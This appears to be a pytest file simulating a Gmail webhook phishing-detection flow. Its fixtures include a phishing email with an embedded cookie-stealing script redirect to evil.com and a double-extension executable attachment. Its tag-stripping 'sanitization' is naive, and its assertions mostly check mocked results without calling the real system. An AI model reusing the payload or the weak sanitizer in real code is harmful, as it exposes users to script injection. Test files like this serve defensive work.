"""
End-to-End Gmail Webhook Flow Tests

Simulates complete Gmail webhook processing flow including:
- Gmail webhook payload processing
- Email parsing and analysis
- Threat detection pipeline
- Response generation and validation
"""

import pytest
import pytest_asyncio
import asyncio
import json
import uuid
import base64
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from typing import Dict, Any
import os


@pytest.fixture
def gmail_webhook_payload():
    """Realistic Gmail webhook payload for testing."""
    return {
        "message": {
            "data": base64.b64encode(json.dumps({
                "emailAddress": "user@example.com",
                "historyId": "12345"
            }).encode()).decode(),
            "messageId": "msg-" + str(uuid.uuid4()),
            "publishTime": datetime.now().isoformat() + "Z"
        },
        "subscription": "projects/test-project/subscriptions/gmail-webhook"
    }


@pytest.fixture
def sample_gmail_email_data():
    """Sample Gmail email data for E2E testing."""
    return {
        "id": "email-" + str(uuid.uuid4()),
        "threadId": "thread-" + str(uuid.uuid4()),
        "labelIds": ["INBOX", "UNREAD"],
        "snippet": "This is a test email with potential phishing content...",
        "payload": {
            "partId": "",
            "mimeType": "multipart/alternative",
            "filename": "",
            "headers": [
                {"name": "From", "value": "suspicious-sender@phishing-domain.com"},
                {"name": "To", "value": "victim@company.com"},
                {"name": "Subject", "value": "URGENT: Verify Your Account Immediately"},
                {"name": "Date", "value": "Mon, 12 Sep 2025 10:30:00 +0000"},
                {"name": "Message-ID", "value": "<test-message-id@phishing-domain.com>"},
                {"name": "Reply-To", "value": "noreply@fake-bank.com"}
            ],
            "body": {
                "size": 1024
            },
            "parts": [
                {
                    "partId": "0",
                    "mimeType": "text/plain",
                    "body": {
                        "size": 512,
                        "data": base64.b64encode(
                            ("Dear Customer,\\n\\n"
                            "Your account has been compromised. Click here immediately to secure it:\\n"
                            "https://fake-bank-security.evil.com/verify-account?token=abc123\\n\\n"
                            "If you don't act within 24 hours, your account will be closed.\\n\\n"
                            "Best regards,\\n"
                            "Security Team").encode()
                        ).decode()
                    }
                },
                {
                    "partId": "1", 
                    "mimeType": "text/html",
                    "body": {
                        "size": 1024,
                        "data": base64.b64encode(
                            ("<html><body>"
                            "<p>Dear Customer,</p>"
                            "<p>Your account has been <strong>compromised</strong>. "
                            "<a href=\"https://fake-bank-security.evil.com/verify-account?token=abc123\">"
                            "Click here immediately</a> to secure it.</p>"
                            "<script>document.location='https://evil.com/steal-cookies';</script>"
                            "<p>If you don't act within 24 hours, your account will be closed.</p>"
                            "<p>Best regards,<br>Security Team</p>"
                            "</body></html>").encode()
                        ).decode()
                    }
                }
            ]
        },
        "sizeEstimate": 2048,
        "historyId": "54321",
        "internalDate": str(int(datetime.now().timestamp() * 1000))
    }


@pytest.fixture
def mock_gmail_api(sample_gmail_email_data):
    """Mock Gmail API responses for E2E testing."""
    mock_api = MagicMock()
    
    # Mock history list response
    mock_api.users().history().list().execute.return_value = {
        "history": [
            {
                "id": "12345",
                "messages": [
                    {"id": "email-123", "threadId": "thread-123"}
                ]
            }
        ]
    }
    
    # Mock message get response will be provided by sample_gmail_email_data
    def mock_get_message(**kwargs):
        mock_response = MagicMock()
        mock_response.execute.return_value = sample_gmail_email_data
        return mock_response
    
    mock_api.users().messages().get.return_value = mock_get_message()
    
    return mock_api


@pytest.fixture
def test_environment_e2e():
    """Set up E2E test environment."""
    test_env = {
        'TESTING': 'true',
        'ENVIRONMENT': 'development',
        'SECRET_KEY': 'test-secret-key-with-32-plus-characters-for-testing',
        'DATABASE_URL': 'sqlite:///./test_e2e.db',
        'REDIS_URL': 'redis://localhost:6379/2',
        'ENABLE_EXTERNAL_APIS': 'false',
        'GMAIL_CLIENT_ID': 'test_gmail_client_id',
        'GMAIL_CLIENT_SECRET': 'test_gmail_client_secret',
        'WEBHOOK_SECRET': 'test_webhook_secret',
        'LOG_LEVEL': 'ERROR'
    }
    
    with patch.dict(os.environ, test_env):
        yield test_env


@pytest_asyncio.fixture
async def mock_phishing_detection_pipeline():
    """Mock the complete phishing detection pipeline."""
    
    # Mock threat detection results for suspicious email
    threat_results = {
        'threat_level': 'high',
        'verdict': 'malicious',
        'confidence': 0.92,
        'analysis_details': {
            'url_analysis': {
                'malicious_urls': ['https://fake-bank-security.evil.com'],
                'suspicious_domains': ['evil.com'],
                'redirect_chains': []
            },
            'content_analysis': {
                'phishing_indicators': [
                    'urgent_language',
                    'account_compromise',
                    'suspicious_links',
                    'fake_branding'
                ],
                'xss_detected': True,
                'social_engineering_score': 0.89
            },
            'sender_analysis': {
                'domain_reputation': 'suspicious',
                'spoofing_detected': True,
                'sender_score': 0.15
            }
        },
        'recommended_actions': [
            'quarantine_email',
            'block_sender',
            'alert_security_team'
        ],
        'processing_time': 2.34,
        'scan_id': str(uuid.uuid4())
    }
    
    return threat_results


@pytest.mark.asyncio
class TestGmailWebhookE2E:
    """End-to-end tests for Gmail webhook processing flow."""
    
    async def test_complete_gmail_webhook_flow(
        self, 
        gmail_webhook_payload, 
        sample_gmail_email_data,
        mock_gmail_api,
        mock_phishing_detection_pipeline,
        test_environment_e2e
    ):
        """Test complete Gmail webhook processing from start to finish."""
        
        print("🚀 Starting Gmail webhook E2E flow test")
        
        # Step 1: Process webhook payload
        webhook_data = gmail_webhook_payload
        
        # Extract message data
        message_data = json.loads(
            base64.b64decode(webhook_data["message"]["data"]).decode()
        )
        
        assert "emailAddress" in message_data
        assert "historyId" in message_data
        
        print(f"   ✅ Webhook payload processed")
        print(f"      Email: {message_data['emailAddress']}")
        print(f"      History ID: {message_data['historyId']}")
        
        # Step 2: Fetch email data (simulated)
        email_data = sample_gmail_email_data
        
        # Extract email content
        headers = {h["name"]: h["value"] for h in email_data["payload"]["headers"]}
        
        # Decode email parts
        email_content = {
            "sender": headers.get("From"),
            "recipient": headers.get("To"), 
            "subject": headers.get("Subject"),
            "message_id": headers.get("Message-ID"),
            "date": headers.get("Date"),
            "plain_content": "",
            "html_content": "",
            "links": []
        }
        
        # Process email parts
        for part in email_data["payload"]["parts"]:
            if part["mimeType"] == "text/plain":
                email_content["plain_content"] = base64.b64decode(
                    part["body"]["data"]
                ).decode()
            elif part["mimeType"] == "text/html":
                email_content["html_content"] = base64.b64decode(
                    part["body"]["data"]
                ).decode()
        
        print(f"   ✅ Email data extracted")
        print(f"      From: {email_content['sender']}")
        print(f"      Subject: {email_content['subject']}")
        print(f"      Content length: {len(email_content['html_content'])} chars")
        
        # Step 3: Security analysis and sanitization
        
        # Check for XSS in HTML content
        html_content = email_content["html_content"]
        xss_detected = "<script>" in html_content
        
        # Sanitize content (remove XSS)
        sanitized_html = html_content.replace("<script>", "").replace("</script>", "")
        
        # Extract and analyze URLs
        import re
        url_pattern = r'https?://[^\s<>"\']+|www\.[^\s<>"\']+'
        urls = re.findall(url_pattern, html_content)
        
        suspicious_domains = ['evil.com', 'fake-bank-security.evil.com']
        malicious_urls = [url for url in urls if any(domain in url for domain in suspicious_domains)]
        
        print(f"   ✅ Security analysis completed")
        print(f"      XSS detected: {xss_detected}")
        print(f"      URLs found: {len(urls)}")
        print(f"      Malicious URLs: {len(malicious_urls)}")
        
        # Step 4: Threat scoring and aggregation
        threat_analysis = mock_phishing_detection_pipeline
        
        # Verify threat analysis results
        assert threat_analysis["threat_level"] == "high"
        assert threat_analysis["verdict"] == "malicious"
        assert threat_analysis["confidence"] > 0.9
        
        print(f"   ✅ Threat analysis completed")
        print(f"      Threat Level: {threat_analysis['threat_level']}")
        print(f"      Verdict: {threat_analysis['verdict']}")
        print(f"      Confidence: {threat_analysis['confidence']:.2f}")
        
        # Step 5: Generate response and recommendations
        response = {
            "scan_id": threat_analysis["scan_id"],
            "email_id": email_data["id"],
            "timestamp": datetime.now().isoformat(),
            "threat_assessment": {
                "level": threat_analysis["threat_level"],
                "verdict": threat_analysis["verdict"],
                "confidence": threat_analysis["confidence"]
            },
            "security_issues": {
                "xss_detected": xss_detected,
                "malicious_urls": malicious_urls,
                "phishing_indicators": threat_analysis["analysis_details"]["content_analysis"]["phishing_indicators"]
            },
            "recommendations": threat_analysis["recommended_actions"],
            "processing_metadata": {
                "processing_time": threat_analysis["processing_time"],
                "sanitization_applied": xss_detected,
                "urls_analyzed": len(urls)
            }
        }
        
        print(f"   ✅ Response generated")
        print(f"      Scan ID: {response['scan_id']}")
        print(f"      Recommendations: {len(response['recommendations'])}")
        
        # Step 6: Validate end-to-end flow
        
        # Verify all critical components were processed
        assert response["threat_assessment"]["level"] in ["low", "medium", "high", "critical"]
        assert response["threat_assessment"]["verdict"] in ["safe", "suspicious", "malicious"]
        assert 0.0 <= response["threat_assessment"]["confidence"] <= 1.0
        
        # Verify security issues were detected
        assert response["security_issues"]["xss_detected"] == True
        assert len(response["security_issues"]["malicious_urls"]) > 0
        assert len(response["security_issues"]["phishing_indicators"]) > 0
        
        # Verify recommendations were generated
        assert "quarantine_email" in response["recommendations"]
        assert "block_sender" in response["recommendations"]
        
        print(f"🎉 Gmail webhook E2E flow completed successfully!")
        print(f"   Total processing time: {response['processing_metadata']['processing_time']}s")
        print(f"   Security measures applied: {len(response['recommendations'])}")
        
        return response
    
    async def test_legitimate_email_flow(
        self, 
        gmail_webhook_payload,
        test_environment_e2e
    ):
        """Test E2E flow with legitimate email (should not trigger alerts)."""
        
        print("📧 Starting legitimate email E2E flow test")
        
        # Create legitimate email data
        legitimate_email = {
            "id": "email-legit-" + str(uuid.uuid4()),
            "payload": {
                "headers": [
                    {"name": "From", "value": "newsletter@legitimate-company.com"},
                    {"name": "To", "value": "user@company.com"},
                    {"name": "Subject", "value": "Monthly Newsletter - Company Updates"},
                    {"name": "Message-ID", "value": "<newsletter@legitimate-company.com>"}
                ],
                "parts": [
                    {
                        "mimeType": "text/html",
                        "body": {
                            "data": base64.b64encode(
                                ("<html><body>"
                                "<p>Dear Valued Customer,</p>"
                                "<p>Thank you for your continued support. Here are this month's updates:</p>"
                                "<ul><li>New product features</li><li>Customer success stories</li></ul>"
                                "<p>Visit our website: <a href=\"https://legitimate-company.com\">legitimate-company.com</a></p>"
                                "<p>Best regards,<br>The Team</p>"
                                "</body></html>").encode()
                            ).decode()
                        }
                    }
                ]
            }
        }
        
        # Process legitimate email
        headers = {h["name"]: h["value"] for h in legitimate_email["payload"]["headers"]}
        html_content = base64.b64decode(
            legitimate_email["payload"]["parts"][0]["body"]["data"]
        ).decode()
        
        # Security analysis
        xss_detected = "<script>" in html_content
        
        # URL analysis
        import re
        urls = re.findall(r'https?://[^\s<>"\']+', html_content)
        suspicious_domains = ['evil.com', 'phishing.com', 'malware.net']
        malicious_urls = [url for url in urls if any(domain in url for domain in suspicious_domains)]
        
        # Threat assessment for legitimate email
        threat_analysis = {
            "threat_level": "low",
            "verdict": "safe", 
            "confidence": 0.95,
            "xss_detected": xss_detected,
            "malicious_urls": malicious_urls,
            "phishing_indicators": []  # No indicators for legitimate email
        }
        
        print(f"   ✅ Legitimate email processed")
        print(f"      From: {headers['From']}")
        print(f"      Threat Level: {threat_analysis['threat_level']}")
        print(f"      XSS detected: {threat_analysis['xss_detected']}")
        print(f"      Malicious URLs: {len(threat_analysis['malicious_urls'])}")
        
        # Verify legitimate email classification
        assert threat_analysis["threat_level"] == "low"
        assert threat_analysis["verdict"] == "safe"
        assert threat_analysis["xss_detected"] == False
        assert len(threat_analysis["malicious_urls"]) == 0
        assert len(threat_analysis["phishing_indicators"]) == 0
        
        print(f"🎉 Legitimate email flow completed - correctly classified as safe!")
        
        return threat_analysis
    
    async def test_attachment_processing_simulation(self, test_environment_e2e):
        """Test E2E flow with email attachments."""
        
        print("📎 Starting attachment processing E2E test")
        
        # Email with suspicious attachment
        email_with_attachment = {
            "payload": {
                "headers": [
                    {"name": "From", "value": "attacker@malicious.com"},
                    {"name": "Subject", "value": "Important Document - Please Review"}
                ],
                "parts": [
                    {
                        "mimeType": "text/plain",
                        "body": {
                            "data": base64.b64encode(
                                "Please review the attached document urgently.".encode()
                            ).decode()
                        }
                    },
                    {
                        "mimeType": "application/pdf",
                        "filename": "invoice.pdf.exe",  # Suspicious double extension
                        "body": {
                            "attachmentId": "attachment-123",
                            "size": 51200
                        }
                    }
                ]
            }
        }
        
        # Process attachment metadata
        attachments = []
        for part in email_with_attachment["payload"]["parts"]:
            if "filename" in part:
                attachment = {
                    "filename": part["filename"],
                    "mime_type": part["mimeType"],
                    "size": part["body"]["size"],
                    "attachment_id": part["body"].get("attachmentId")
                }
                attachments.append(attachment)
        
        # Analyze attachment security
        attachment_analysis = []
        for attachment in attachments:
            filename = attachment["filename"]
            
            # Check for suspicious patterns
            suspicious_extensions = [".exe", ".scr", ".bat", ".com", ".pif"]
            double_extension = len(filename.split(".")) > 2
            suspicious = any(filename.endswith(ext) for ext in suspicious_extensions)
            
            analysis = {
                "filename": filename,
                "suspicious": suspicious or double_extension,
                "threat_level": "high" if (suspicious or double_extension) else "low",
                "reasons": []
            }
            
            if double_extension:
                analysis["reasons"].append("double_extension")
            if suspicious:
                analysis["reasons"].append("suspicious_extension")
            
            attachment_analysis.append(analysis)
        
        print(f"   ✅ Attachment analysis completed")
        print(f"      Attachments found: {len(attachments)}")
        
        for analysis in attachment_analysis:
            print(f"      File: {analysis['filename']}")
            print(f"        Threat Level: {analysis['threat_level']}")
            print(f"        Suspicious: {analysis['suspicious']}")
            print(f"        Reasons: {analysis['reasons']}")
        
        # Verify suspicious attachment detection
        assert len(attachment_analysis) > 0
        assert attachment_analysis[0]["suspicious"] == True
        assert attachment_analysis[0]["threat_level"] == "high"
        assert "double_extension" in attachment_analysis[0]["reasons"]
        
        print(f"🎉 Attachment processing completed - suspicious file detected!")
        
        return attachment_analysis
    
    async def test_webhook_error_handling(self, test_environment_e2e):
        """Test E2E error handling scenarios."""
        
        print("⚠️ Starting webhook error handling E2E test")
        
        # Test scenarios with various error conditions
        error_scenarios = [
            {
                "name": "Invalid webhook payload",
                "payload": {"invalid": "data"},
                "expected_error": "invalid_payload"
            },
            {
                "name": "Malformed base64 data",
                "payload": {"message": {"data": "invalid-base64!!!"}},
                "expected_error": "decode_error"
            },
            {
                "name": "Missing required fields",
                "payload": {"message": {"data": base64.b64encode(b'{}').decode()}},
                "expected_error": "missing_fields"
            }
        ]
        
        error_results = []
        
        for scenario in error_scenarios:
            print(f"   Testing: {scenario['name']}")
            
            try:
                # Attempt to process invalid payload
                payload = scenario["payload"]
                
                if "message" in payload and "data" in payload["message"]:
                    # Try to decode
                    data = base64.b64decode(payload["message"]["data"]).decode()
                    parsed_data = json.loads(data)
                    
                    # Check for required fields
                    if "emailAddress" not in parsed_data:
                        raise ValueError("Missing emailAddress")
                    
                    result = {"status": "success", "data": parsed_data}
                else:
                    raise ValueError("Invalid payload structure")
                    
            except Exception as e:
                result = {
                    "status": "error",
                    "error_type": type(e).__name__,
                    "message": str(e)
                }
            
            error_results.append({
                "scenario": scenario["name"],
                "result": result
            })
            
            print(f"      Result: {result['status']}")
            if result["status"] == "error":
                print(f"      Error: {result['error_type']} - {result['message']}")
        
        # Verify error handling
        error_count = sum(1 for result in error_results if result["result"]["status"] == "error")
        
        print(f"   ✅ Error scenarios processed: {len(error_scenarios)}")
        print(f"   ✅ Errors correctly handled: {error_count}")
        
        assert error_count > 0  # Should have detected errors
        assert error_count == len(error_scenarios)  # All scenarios should produce errors
        
        print(f"🎉 Error handling validation completed!")
        
        return error_results


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
